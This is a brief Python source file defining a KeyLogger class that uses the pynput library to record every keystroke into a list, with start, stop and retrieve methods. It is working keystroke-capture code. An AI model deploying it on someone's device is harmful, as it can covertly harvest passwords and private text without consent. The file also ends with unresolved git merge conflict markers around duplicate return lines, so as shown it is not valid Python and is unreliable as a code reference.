from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.keys = []
        self.listener = None
        self.is_logging = False

    def _on_press(self, key):
        try:
            self.keys.append(key.char)
        except AttributeError:
            self.keys.append(str(key))

    def start_logging(self):
        if not self.is_logging:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self.is_logging = True

    def stop_logging(self):
        if self.listener and self.is_logging:
            self.listener.stop()
            self.is_logging = False

    def get_events(self):
        keys = self.keys[:]
        self.keys.clear()
<<<<<<< HEAD
        return keys
=======
        return keys
>>>>>>> d0653179eb7258d2360ff0f778e622f5189cf45d
